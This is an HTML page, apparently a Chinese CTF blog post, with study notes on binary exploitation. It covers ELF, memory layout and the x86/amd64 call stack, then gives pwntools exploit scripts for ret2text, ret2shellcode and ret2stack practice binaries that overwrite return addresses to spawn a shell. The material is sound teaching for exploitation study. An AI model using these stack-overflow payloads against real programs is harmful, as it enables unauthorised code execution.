@@ -1,0 +1,1352 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+  <title>Pwn - Knight&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Knight's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/post.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Pwn">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-01-19 00:00" pubdate>
+        2022年1月19日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      107
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Pwn</h1>
+            
+            <div class="markdown-body">
+              <meta name="referrer" content="no-referrer">
+
+<h1 id="Pwn-二进制漏洞挖掘与利用"><a href="#Pwn-二进制漏洞挖掘与利用" class="headerlink" title="Pwn(二进制漏洞挖掘与利用)"></a>Pwn(二进制漏洞挖掘与利用)</h1><blockquote>
+<p>整理自：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1854y1y7Ro?spm_id_from=333.851.header_right.fav_list.click">XMCVE 2020 CTF Pwn入门课程 哔哩哔哩 bilibili</a></p>
+</blockquote>
+<h2 id="0x00-Pwn？"><a href="#0x00-Pwn？" class="headerlink" title="0x00 Pwn？"></a>0x00 Pwn？</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><ul>
+<li>破解、利用成功（程序的二进制漏洞）</li>
+<li>攻破（设备、服务器）</li>
+<li>控制（设备、服务器）</li>
+</ul>
+<h3 id="一次简单的hack"><a href="#一次简单的hack" class="headerlink" title="一次简单的hack"></a>一次简单的hack</h3><ul>
+<li><p>exploit</p>
+<ul>
+<li>用于攻击的脚本与方案</li>
+</ul>
+</li>
+<li><p>payload</p>
+<ul>
+<li>攻击载荷，是目标进程被劫持控制流的数据</li>
+</ul>
+</li>
+<li><p>shellcode</p>
+<ul>
+<li>调用攻击目标的 shell 的代码</li>
+</ul>
+</li>
+</ul>
+<h2 id="0x01-二进制基础"><a href="#0x01-二进制基础" class="headerlink" title="0x01 二进制基础"></a>0x01 二进制基础</h2><h3 id="1、程序的编译与链接"><a href="#1、程序的编译与链接" class="headerlink" title="1、程序的编译与链接"></a>1、程序的编译与链接</h3><p>从C源代码到可执行文件的生成过程：</p>
+<ul>
+<li>编译<ul>
+<li>由C语言代码生成汇编代码</li>
+</ul>
+</li>
+<li><p>汇编</p>
+<ul>
+<li>由汇编代码生成机器码</li>
+</ul>
+</li>
+<li><p>链接</p>
+<ul>
+<li>将多个机器码的目标文件链接成一个可执行文件</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/9bb4b113fea69d8b2dddae04e1600866.png" srcset="/img/loading.gif" lazyload alt="image-20211202205623782" style="zoom:67%;"></p>
+<h3 id="2、Linux下的可执行文件格式ELF"><a href="#2、Linux下的可执行文件格式ELF" class="headerlink" title="2、Linux下的可执行文件格式ELF"></a>2、Linux下的可执行文件格式ELF</h3><p><strong>什么是可执行文件？</strong></p>
+<ul>
+<li><p>广义：文件中的数据是可执行代码的文件</p>
+<ul>
+<li>.out、.exe、.sh、.py</li>
+</ul>
+</li>
+<li><p>狭义：文件中的数据是机器码的文件</p>
+<ul>
+<li>.out、.exe、.dll、.so</li>
+</ul>
+</li>
+</ul>
+<p><strong>可执行文件的分类</strong></p>
+<ul>
+<li><p>Windows：PE（Portable Executable）</p>
+<ul>
+<li>可执行程序<ul>
+<li>.exe</li>
+</ul>
+</li>
+<li>动态链接库<ul>
+<li>.dll</li>
+</ul>
+</li>
+<li>静态链接库<ul>
+<li>.lib</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Linux：ELF（Executable and Linkable Format）</p>
+<ul>
+<li>可执行程序<ul>
+<li>.out</li>
+</ul>
+</li>
+<li>动态链接库<ul>
+<li>.so</li>
+</ul>
+</li>
+<li>静态链接库<ul>
+<li>.a</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>ELF 文件结构：</strong></p>
+<ul>
+<li><p>ELF文件头表（ELF header）</p>
+<ul>
+<li>记录了ELF文件的组织结构</li>
+</ul>
+</li>
+<li><p>程序头表/段表（Program header table）</p>
+<ul>
+<li>告诉系统如何创建进程</li>
+<li>生成进程的可执行文件必须拥有此结构</li>
+<li>重定位文件不一定需要</li>
+</ul>
+</li>
+<li><p>节头表（Section header table）</p>
+<ul>
+<li>记录了ELF文件的节区信息</li>
+<li>用于链接的目标文件必须拥有此结构</li>
+<li>其它类型目标文件不一定需要</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/c5dfe3a8c7ac1d28a4499b8d887e94cb.png" srcset="/img/loading.gif" lazyload alt="image-20211202205758815" style="zoom:67%;"></p>
+<h3 id="3、进程虚拟地址空间"><a href="#3、进程虚拟地址空间" class="headerlink" title="3、进程虚拟地址空间"></a>3、进程虚拟地址空间</h3><p>地址以字节编码（1 Byte = 8 bits），常以16进制表示（0x3c = 0011 1100） </p>
+<ul>
+<li>虚拟内存用户空间每个进程一份</li>
+<li>虚拟内存内核空间所有进程共享一份</li>
+<li>虚拟内存 mmap 段中的动态链接库仅在物理内存中装载一份</li>
+</ul>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/6441eaa30b474add83de904cbda9734a.png" srcset="/img/loading.gif" lazyload alt="image-20220120152751897" style="zoom:67%;"></p>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/cd9c8303ce3452e633fc07f5fd5776e0.png" srcset="/img/loading.gif" lazyload alt="image-20220120152843731" style="zoom:50%;"></p>
+<p><strong>磁盘中的ELF（可执行文件）与内存中的ELF（进程内存映像）</strong> </p>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/2ddf517f9f2981568c4c06ed68f2b371.png" srcset="/img/loading.gif" lazyload alt="image-20220406180913602"></p>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/198d1d761b2e9a1b4330e7fbfeb70122.png" srcset="/img/loading.gif" lazyload alt="image-20220406180644137"></p>
+<p><strong>段（segment）与节（section）</strong></p>
+<ul>
+<li>一个 <strong>段</strong> 包含多个 <strong>节</strong></li>
+<li>段视图用于<strong>进程的内存</strong>区域的 <strong>rwx 权限划分</strong></li>
+<li><p>节视图用于<strong>ELF文件</strong>编译链接时与在<strong>磁盘</strong>上存储时的<strong>文件结构</strong>的组织</p>
+</li>
+<li><p>代码段（Text segment）包含了代码与只读数据</p>
+<ul>
+<li><strong>.text 节</strong></li>
+<li>.rodata 节 </li>
+<li>.hash 节 </li>
+<li>.dynsym 节 </li>
+<li>.dynstr 节 </li>
+<li>.<strong>plt 节</strong></li>
+<li>.rel.got 节 </li>
+<li>……</li>
+</ul>
+</li>
+<li><p>数据段（Data segment）包含了可读可写数据</p>
+<ul>
+<li>.data 节 </li>
+<li>.dynamic 节 </li>
+<li>.got 节 </li>
+<li><strong>.got.plt 节</strong></li>
+<li><strong>.bss 节</strong></li>
+<li>……</li>
+</ul>
+</li>
+<li><p>栈段（Stack segment）</p>
+</li>
+</ul>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/31f049ee54ba43a4dfcfef96b81a5876.png" srcset="/img/loading.gif" lazyload alt="image-20220120153432565" style="zoom:67%;"></p>
+<h3 id="4、程序的装载与进程的执行"><a href="#4、程序的装载与进程的执行" class="headerlink" title="4、程序的装载与进程的执行"></a>4、程序的装载与进程的执行</h3><p><strong>小端序与大端序</strong></p>
+<ul>
+<li><p>小端序</p>
+<ul>
+<li>低地址存放数据低位、高地址存放数据高位</li>
+<li>我们所主要关注的格式</li>
+</ul>
+</li>
+<li><p>大端序</p>
+<ul>
+<li>低地址存放数据高位、高地址存放数据低位</li>
+</ul>
+</li>
+</ul>
+<p><strong>amd64寄存器结构</strong></p>
+<ul>
+<li>rax： 8Bytes</li>
+<li>eax：4Bytes</li>
+<li>ax： 2Bytes</li>
+<li>ah： 1Bytes</li>
+<li>al：  1Bytes</li>
+</ul>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/d6526b81f2f8e1c28cc07843f8745f0b.png" srcset="/img/loading.gif" lazyload alt="image-20220406174621225"></p>
+<p><strong>部分寄存器的功能</strong></p>
+<ul>
+<li><p>RIP</p>
+<ul>
+<li>存放当前执行的指令的地址</li>
+</ul>
+</li>
+<li><p>RSP</p>
+<ul>
+<li>存放当前栈帧的栈顶地址</li>
+</ul>
+</li>
+<li><p>RBP</p>
+<ul>
+<li>存放当前栈帧的栈底地址</li>
+</ul>
+</li>
+<li><p>RAX</p>
+<ul>
+<li>通用寄存器。存放函数返回值</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/8e0c5c69bd5fbfe4ad88f1a586cce0ae.png" srcset="/img/loading.gif" lazyload alt="image-20220405222925297"></p>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/f5d09e35d719712d53122860bb31ae4f.png" srcset="/img/loading.gif" lazyload alt="image-20220405222954888"></p>
+<h3 id="5、x86-amp-amd64汇编简述"><a href="#5、x86-amp-amd64汇编简述" class="headerlink" title="5、x86&amp;amd64汇编简述"></a>5、x86&amp;amd64汇编简述</h3><p><strong>常用汇编指令：</strong></p>
+<p>MOV、LEA、ADD/SUB、PUSH、POP、CMP、JMP、J[Condition]、CALL、LEAVE、RET……</p>
+<p><strong>MOV</strong></p>
+<ul>
+<li>MOV DEST, SRC        ; 把源操作数传送给目标</li>
+<li>MOV EAX,1234H   ; 执行结果（EAX） = 1234H</li>
+<li>MOV EBX, EAX </li>
+<li>MOV EAX, [00404011H] ; [ ] 表示取地址内的值</li>
+<li>MOV EAX, [ESI] </li>
+</ul>
+<p><strong>LEA</strong></p>
+<ul>
+<li>LEA REG, SRC          ; 把源操作数的有效地址送给指定的寄存器</li>
+<li>LEA EBX, ASC          ; 取 ASC 的地址存放至 EBX 寄存器中</li>
+<li>LEA EAX, 6[ESI]         ; 把 ESI+6 单元的32位地址送给 EAX </li>
+</ul>
+<p><strong>PUSH</strong></p>
+<ul>
+<li>PUSH VALUE         ; 把目标值压栈，同时SP指针-1字长</li>
+<li>PUSH 1234H </li>
+<li>PUSH EAX</li>
+</ul>
+<p><strong>POP</strong></p>
+<ul>
+<li>POP DEST ; 将栈顶的值弹出至目的存储位置，同时SP指针+1字长</li>
+<li>POP EAX</li>
+</ul>
+<p><strong>LEAVE</strong></p>
+<ul>
+<li>在函数返回时，恢复父函数栈帧的指令</li>
+<li>等效于：<ul>
+<li>MOV ESP, EBP</li>
+<li>POP EBP</li>
+</ul>
+</li>
+</ul>
+<p><strong>RET</strong></p>
+<ul>
+<li><p>在函数返回时，控制程序执行流返回父函数的指令</p>
+</li>
+<li><p>等效于：POP RIP（这条指令实际是不存在的，不能直接向RIP寄存器传送数据）</p>
+</li>
+</ul>
+<p><strong>两种汇编格式：</strong></p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>intel</th>
+<th>AT&amp;T</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>mov  eax, 8</td>
+<td>movl  $8, %eax</td>
+</tr>
+<tr>
+<td>mov  ebx, 0ffffh</td>
+<td>movl  $0xffff, %ebx</td>
+</tr>
+<tr>
+<td>int  80h</td>
+<td>int  $80</td>
+</tr>
+<tr>
+<td>mov  eax, [ecx]</td>
+<td>movl  (%ecx), %eax</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/1e9b520c251c9b722d2f7655f3ef5de1.png" srcset="/img/loading.gif" lazyload alt="image-20220405223206766"></p>
+<h2 id="0x02-栈溢出"><a href="#0x02-栈溢出" class="headerlink" title="0x02 栈溢出"></a>0x02 栈溢出</h2><h3 id="1、C语言函数调用栈"><a href="#1、C语言函数调用栈" class="headerlink" title="1、C语言函数调用栈"></a>1、C语言函数调用栈</h3><ul>
+<li><p>函数调用栈是指程序运行时内存一段连续的区域</p>
+</li>
+<li><p>用来保存函数运行时的状态信息，包括函数参数与局部变量等</p>
+</li>
+<li><p>称之为“栈”是因为发生函数调用时，调用函数（caller）的状态被保存在栈内，被调用函数（callee）的状态被压入调用栈的栈顶</p>
+</li>
+<li><p>在函数调用结束时，栈顶的函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态</p>
+</li>
+<li><p>函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大</p>
+</li>
+</ul>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/73bc74be726ca183746fad65712e77fd.png" srcset="/img/loading.gif" lazyload alt="image-20220121142507825"></p>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/34fae6734a56d2a74e26d5d003559eeb.png" srcset="/img/loading.gif" lazyload alt="image-20220410130656233"></p>
+<p><strong>函数状态主要涉及三个寄存器 —— esp，ebp，eip</strong></p>
+<ul>
+<li>esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。</li>
+<li>ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。</li>
+<li>eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</li>
+</ul>
+<p><strong>发生函数调用时，栈顶函数状态以及上述寄存器的变化</strong></p>
+<blockquote>
+<p>变化的核心任务是将调用函数（caller）的状态保存起来，同时创建被调用函数（callee）的状态。</p>
+</blockquote>
+<ul>
+<li><p>首先将被调用函数（callee）的参数按照逆序依次压入栈内。如果被调用函数（callee）不需要参数，则没有这一步骤。这些参数仍会保存在调用函数（caller）的函数状态内，之后压入栈内的数据都会作为被调用函数（callee）的函数状态来保存。</p>
+</li>
+<li><p>然后将调用函数（caller）进行调用之后的下一条指令地址作为返回地址压入栈内。这样调用函数（caller）的 eip（指令）信息得以保存。</p>
+</li>
+<li><p>再将当前的ebp 寄存器的值（也就是调用函数的基地址）压入栈内，并将 ebp 寄存器的值更新为当前栈顶的地址。这样调用函数（caller）的 ebp（基地址）信息得以保存。同时，ebp 被更新为被调用函数（callee）的基地址。</p>
+</li>
+<li><p>再之后是将被调用函数（callee）的局部变量等数据压入栈内。</p>
+</li>
+<li><p>在压栈的过程中，esp 寄存器的值不断减小（对应于栈从内存高地址向低地址生长）。压入栈内的数据包括调用参数、返回地址、调用函数的基地址，以及局部变量，其中调用参数以外的数据共同构成了被调用函数（callee）的状态。在发生调用时，程序还会将被调用函数（callee）的指令地址存到 eip 寄存器内，这样程序就可以依次执行被调用函数的指令了。</p>
+</li>
+</ul>
+<p><strong>函数调用结束时的变化</strong></p>
+<blockquote>
+<p>变化的核心任务是丢弃被调用函数（callee）的状态，并将栈顶恢复为调用函数（caller）的状态。</p>
+</blockquote>
+<ul>
+<li><p>首先被调用函数的局部变量会从栈内直接弹出，栈顶会指向被调用函数（callee）的基地址。</p>
+</li>
+<li><p>然后将基地址内存储的调用函数（caller）的基地址从栈内弹出，并存到 ebp 寄存器内。这样调用函数（caller）的 ebp（基地址）信息得以恢复。此时栈顶会指向返回地址。</p>
+</li>
+<li><p>再将返回地址从栈内弹出，并存到 eip 寄存器内。这样调用函数（caller）的 eip（指令）信息得以恢复。</p>
+</li>
+<li><p>至此调用函数（caller）的函数状态就全部恢复了，之后就是继续执行调用函数的指令了。</p>
+</li>
+</ul>
+<p><strong>函数调用栈的工作方式（cdecl）</strong></p>
+<ul>
+<li>x86<ul>
+<li>使用栈来传递参数</li>
+<li>使用 eax 存放返回值</li>
+</ul>
+</li>
+<li>amd64<ul>
+<li>前6个参数依次存放于 rdi、rsi、rdx、rcx、r8、r9 寄存器中</li>
+<li>第7个以后的参数存放于栈中</li>
+</ul>
+</li>
+</ul>
+<p><strong>缓冲区溢出（Buffer overflow）</strong></p>
+<blockquote>
+<p>本质是向定长的缓冲区中写入了超长的数据，造成超出的数据覆写了合法内存区域</p>
+</blockquote>
+<ul>
+<li><p>栈溢出（Stack overflow）</p>
+<ul>
+<li>最常见、漏洞比例最高、危害最大的二进制漏洞</li>
+<li>在 CTF PWN 中往往是漏洞利用的基础</li>
+</ul>
+</li>
+<li><p>堆溢出（Heap overflow）</p>
+<ul>
+<li>堆管理器复杂，利用花样繁多</li>
+<li>CTF PWN 中的常见题型</li>
+</ul>
+</li>
+<li><p>Data段溢出</p>
+<ul>
+<li>攻击效果依赖于 Data段上存放了何种控制数据</li>
+</ul>
+</li>
+</ul>
+<p>介绍完背景知识，就可以继续回归栈溢出攻击的主题了。当函数正在执行内部指令的过程中我们无法拿到程序的控制权，只有在发生函数调用或者结束函数调用时，程序的控制权会在函数状态之间发生跳转，这时才可以通过修改函数状态来实现攻击。而控制程序执行指令最关键的寄存器就是 eip，所以我们的目标就是让 eip 载入攻击指令的地址。</p>
+<p>先来看看函数调用结束时，如果要让 eip 指向攻击指令，需要哪些准备？首先，在退栈过程中，返回地址会被传给 eip，所以我们只需要让溢出数据用攻击指令的地址来覆盖返回地址就可以了。其次，我们可以在溢出数据内包含一段攻击指令，也可以在内存其他位置寻找可用的攻击指令。</p>
+<p><img src="/2022/01/19/CTF/Pwn/Pwn/48d4fa4dd9ab1a5f7426e4eef3642de9.png" srcset="/img/loading.gif" lazyload alt="image-20220121143254140" style="zoom:67%;"></p>
+<ul>
+<li><p>ret2text：篡改栈帧上的返回地址为程序中已有的后门函数</p>
+<ul>
+<li><p>ret_addr = backdoor_addr</p>
+</li>
+<li><p>```c<br>int get_shell()<br>{</p>
+<pre><code>system(&quot;/bin/sh&quot;); //相当于在终端（shell）中执行/bin/sh，得到一个shell
+return 0;
+</code></pre><p>}</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><br>- ret2shellcode：篡改栈帧上的返回地址为攻击者手动传入的 <span class="hljs-keyword">shellcode </span>所在缓冲区地址<br>  - ret_addr = <span class="hljs-keyword">shellcode_addr</span><br><span class="hljs-keyword"></span>  - 初期往往将 <span class="hljs-keyword">shellcode </span>直接写入栈缓冲区<br>  - 目前由于 the NX <span class="hljs-keyword">bits </span>保护措施的开启，栈缓冲区不可执行，故当下的常用手段变为向 <span class="hljs-keyword">bss </span>缓冲区写入 <span class="hljs-keyword">shellcode </span>或向堆缓冲区写入 <span class="hljs-keyword">shellcode </span>并使用 mprotect 赋予其可执行权限<br><br><br><br><span class="hljs-comment">### 2、ret2text</span><br><br>**查看防护措施：**<br><br>```<span class="hljs-keyword">shell</span><br><span class="hljs-keyword"></span>$ checksec ret2text<br></code></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>gdb 调试：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gdb ret2text</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 打断点</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> b main <span class="hljs-comment"># 函数</span></span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> b *0x8048000 <span class="hljs-comment"># 地址</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 运行、进入、下一个</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> r <span class="hljs-comment"># run</span></span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> s <span class="hljs-comment"># step in</span></span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> n <span class="hljs-comment"># next</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 查看栈</span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> stack 24</span><br><br></code></pre></td></tr></table></figure>
+<p><strong>exp.py：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2text&quot;</span>)<br>io.recvline()<br><br>get_shell_addr = <span class="hljs-number">0x8048522</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">16</span> + <span class="hljs-string">b&#x27;BBBB&#x27;</span> + p32(get_shell_addr)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+<h3 id="3、ret2shellcode"><a href="#3、ret2shellcode" class="headerlink" title="3、ret2shellcode"></a>3、ret2shellcode</h3><p><strong>生成 shellcode：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 32 bit</span><br>shellcraft.sh()<br><span class="hljs-built_in">print</span>(shellcraft.sh())<br><br>asm(shellcraft.sh())<br><span class="hljs-built_in">print</span>(asm(shellcraft.sh()))<br><br><span class="hljs-comment"># 64 bit</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>shellcraft.amd64.sh()<br></code></pre></td></tr></table></figure>
+<p><strong>exp.py：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./ret2shellcode&quot;</span>)<br><br>shellcode = asm(shellcraft.sh())<br>buf2_addr = <span class="hljs-number">0x804a080</span><br>payload = shellcode.ljust(<span class="hljs-number">112</span>,<span class="hljs-string">b&#x27;A&#x27;</span>) + p32(buf2_addr)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+<h3 id="4、ret2stack"><a href="#4、ret2stack" class="headerlink" title="4、ret2stack"></a>4、ret2stack</h3><p><img src="/2022/01/19/CTF/Pwn/Pwn/9ff0636bbf3d69e939555ed2a595ce92.png" srcset="/img/loading.gif" lazyload alt="image-20220416150035544" style="zoom:67%;"></p>
+<p><strong>exp.py：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># gdb调试和实际运行地址不一致</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>io = process(<span class="hljs-string">&quot;./ret2stack&quot;</span>)<br>io.recv()<br><br>shellcode = asm(shellcraft.amd64.sh())<br>buf_addr = <span class="hljs-number">0x804a080</span><br><br>payload = shellcode.ljust(<span class="hljs-number">120</span>,<span class="hljs-string">b&#x27;A&#x27;</span>) + p64(buf_addr)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
